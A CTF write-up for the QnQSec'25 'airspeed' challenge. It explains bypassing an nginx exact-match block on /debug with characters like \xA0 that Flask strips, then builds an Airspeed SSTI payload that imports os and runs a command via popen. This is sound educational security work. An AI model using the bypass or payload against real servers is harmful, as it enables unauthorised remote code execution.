---
title: "Challenge airspeed - QnQSec25 Writeup "
CTF: "QnQSec 25"
date: "2025-10-25"
description: "A Detailed Writeup of the airspeed,Challenge based on Nginx Bypass and SSTI"
read: 5
image: /images/qnqsec25/logo.png
---

### **Author:** m0z
#### CTF Name :QnQSec'25
#### No. of solves / Points : 16 Solves / 420 Points
#### **Challenge Description** 
How fast can you go?

## Handout
The Challenge didn't have a lot of source it was mainly a Flask application with airspeed being used as its templating language ,It had a nginx reverse proxy so there was a nginx.conf given alongside those there was a readflag.c , Dockerfile and a docker-compose for being able to build and test it locally.

There is common understanding generally that whenever there is a readflag.c or something along those lines it is most likely a RCE Based Challenge and that you would some way or the other need to get control on the server to read it out

Given:

- **Dockerfile**
```Dockerfile
FROM python:3.12-alpine

ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1

WORKDIR /app

COPY . /app/
RUN apk add --no-cache gcc musl-dev
RUN gcc -o /readflag readflag.c
RUN mv flag /flag && rm readflag.c
RUN chown root:root /flag
RUN chmod 400 /flag
RUN chown root:root /readflag
RUN chmod 4755 /readflag

RUN adduser -D ctf
USER ctf
RUN pip install --no-cache-dir -r requirements.txt

CMD ["python", "app.py"]
```
Seems like a very straightforward Docker all its doing is making flag binary and making the readflag.c not readable anyone making ,so the only way to actually get the flag would be to execute the binary

- **app.py**
```py
import os
from flask import Flask, request
import airspeed

app = Flask(__name__)

# Airspeed loader for file-based templates and partials
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')
CONTENT_DIR = os.path.join(BASE_DIR, 'static', 'content')
loader = airspeed.CachingFileLoader(TEMPLATES_DIR)

def _read_text_file(path: str) -> str:
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return f.read()
    except Exception:
        return ''

LYRICS_TEXT = _read_text_file(os.path.join(CONTENT_DIR, 'lyrics.txt'))

@app.route('/')
def index():
    return render_vm('home.vm', {
        'title': 'Yung Lean Appreciation — Ginseng Strip 2002',
    })


def render_vm(template_name: str, context: dict | None = None) -> str:
    context = context or {}
    template = loader.load_template(template_name)
    return template.merge(context, loader=loader)


@app.route('/lean')
def lean_home():
    return render_vm('home.vm', {
        'title': 'Yung Lean Appreciation — Ginseng Strip 2002',
    })


@app.route('/lyrics')
def lyrics():
    return render_vm('lyrics.vm', {
        'title': 'Lyrics — Ginseng Strip 2002',
        'lyrics': LYRICS_TEXT,
    })


@app.route('/listen')
def listen():
    # Official video ID for embedding (subject to availability)
    youtube_id = 'vrQWhFysPKY'
    return render_vm('listen.vm', {
        'title': 'Listen — Ginseng Strip 2002',
        'youtube_id': youtube_id,
    })


@app.route('/about')
def about():
    return render_vm('about.vm', {
        'title': 'About — Yung Lean & The Track',
    })

@app.route('/debug', methods=['POST'])
def debug():
    name = request.json.get('name', 'World')
    return airspeed.Template(f"Hello, {name}").merge({})


@app.errorhandler(404)
def not_found(e):
    return render_vm('404.vm', {'title': 'Not Found'}), 404


if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)

```
Well this is the whole application as such mainly with the given routes.The whole application is using airspeed which is a lightweight templating language,By me just saying those few words the first thing which probably which went to your head were template Injection or SSTI,We will see as we go.


- **nginx.conf**
```nginx
events {
    worker_connections 1024;  # Adjust as needed for your use case
}

http {
    upstream airspeed {
        server airspeed:5000;  # Match the service name and port specified in docker-compose.yml
    }

    server {
        listen 80;

        location / {
            proxy_pass http://airspeed;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }

        location = /debug {
            deny all;
            return 403;
        }
    }
}
```
This is the nginx configuration set for the application all
```nginx
events {
    worker_connections 1024;
}

upstream airspeed {
    server airspeed:5000;
}
```
These just define how many connections nginx can handle concurrently and that the nginx forwards traffic to a backend flask service called "airspeed".

```nginx
location / {
    proxy_pass http://airspeed;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
```
for all requests to `/` It will proxy them to the flask backend.The `proxy_set_header` directive just forwards important information,

```nginx
        location = /debug {
            deny all;
            return 403;
        }
```
This Blocks any request going to `/debug` Which is something very important to note

![alt text](/images/qnqsec25/business.jpg)

----
## Initial Thoughts/Efforts

There is something very important that ideally is the first thing which would come up when you hear "templating engine"

```py
@app.route('/debug', methods=['POST'])
def debug():
    name = request.json.get('name', 'World')
    return airspeed.Template(f"Hello, {name}").merge({})
```

Well as we assumed there does exists a route `/debug` for template injection to take place.

However The nginx doesnt allow it tho
```nginx
        location = /debug {
            deny all;
            return 403;
        }
```
![alt text](/images/qnqsec25/coincidence.jpg)

This is how it works basically
![Basic_req](/images/qnqsec25/image-2.png)

So we have a basic understanding that we need /debug but we cannot hit it directly

----

## Exploitation Path?
After having a basic idea what is going on we have a common understanding that we need some form of parsing differential to take place hence we look about it a bit more carefully.

Something which we just breezed part before was the nginx location conf
```nginx
        location = /debug {
            deny all;
            return 403;
        }
```
This **Exactly** checks for /debug and not anything with /debug or something.How does that help us ?
![alt text](/images/qnqsec25/ea.png)

This makes our life a bit easier why all we need to find is something that nginx finds but python doesn't ,Well lets get to finding now shall we.
After Fuzzing a lot of character I came across `\xA0` which seemingly worked.
Later we also stumbled across a blog which gave us a few characters such as `\xA0` and `\x85` which flask just removes if it finds in the url.(For reference I Have Linked a fantastic research below which explains it more clearly)

![alt text](/images/qnqsec25/imagee.png)

Alright now that We can reach the debug endpoint its just Standard SSTI right.Well Yes but as per knowledge I didn't really find any resource which could refer to get a working payload so had to make it from scratch

![meme](https://imgflip.com/i/aa5t5d)

```py
@app.route('/debug', methods=['POST'])
def debug():
    name = request.json.get('name', 'World')
    return airspeed.Template(f"Hello, {name}").merge({})
```
Well know just finding a working payload We didn't have a direct way to Call Os Since it isn't passed as a context so we would inherently have to get some class which uses it internally and try calling it from there

Alright Starting with Prior Knowledge to Jinja And other templating languages we are gonna follow that

```
airspeed.Template("#set($r = $xx.__class__.__base__.__subclasses__())$r").merge({})
```
This ended up giving the set of classes i would be able to load One of these classes happened to be

```<class 'warnings.catch_warnings'>```
Which well i assumed would have had something which would allow us to get some system commands so after multiple failed attempts and lot of keyboard smashing I Finally Ended up with something that supposedly worked

```
{"name":"#set($subs = $xx.__class__.__base__.__subclasses__()) #set($warn = $subs.get(221)) #set($winit = $warn.__init__) #set($wglobals = $winit.__globals__) #set($builtins = $wglobals.__builtins__) #set($imp = $builtins.__import__) #set($os = $imp(\u0027os\u0027)) #set($result = $os.popen(\u0027/readflag\u0027).read())$result"}
```

![free](/images/qnqsec25/free.png)
### Final Thoughts
Good Challenge to be honest took a bit to figure out the SSTI , But found new characters which worked for bypassing the nginx conf

For anyone who made it to the end here is cat.

![alt text](/images/qnqsec25/cat.png)

### References
1) [exploiting-http-parsers-inconsistencies](https://blog.bugport.net/exploiting-http-parsers-inconsistencies)